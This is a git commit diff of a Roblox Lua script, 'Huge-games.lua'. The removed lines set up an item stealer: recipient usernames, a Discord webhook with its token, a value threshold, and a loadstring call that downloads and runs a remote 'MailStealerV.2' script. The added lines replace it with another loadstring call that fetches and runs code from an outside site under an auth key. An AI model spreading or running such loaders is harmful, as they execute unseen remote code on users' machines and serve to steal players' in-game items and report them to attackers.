3949bdb57547dc0e248935ca80b4bf0cca3192b5
Kage8eebdjW <137019241+Kage8eebdjW@users.noreply.github.com>
2024-10-29 22:54:20 +0800

    Update Huge-games.lua

--- Huge-games.lua
+++ Huge-games.lua
@@ -1,6 +1,5 @@
-Username = "cabagaming"
-Username2 = "anime1230017"
-webhook = "https://discord.com/api/webhooks/1300131229299114066/jAGn4VLPrq4uT8bGwwMqcXjKSFMk3FTgCDQWWfrVYWYYGO6TCiq-QuwsuFGNpxXt4Ye1"
-min_rap = 1000000
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/WhriterHub/Whiter/main/MailStealerV.2"))()
+getgenv().AuthKey = "HUGE_73hRxG7zwEmR"
+getgenv().LoadSettings = {
+    Example_Setting = Example_Value
+}
+loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
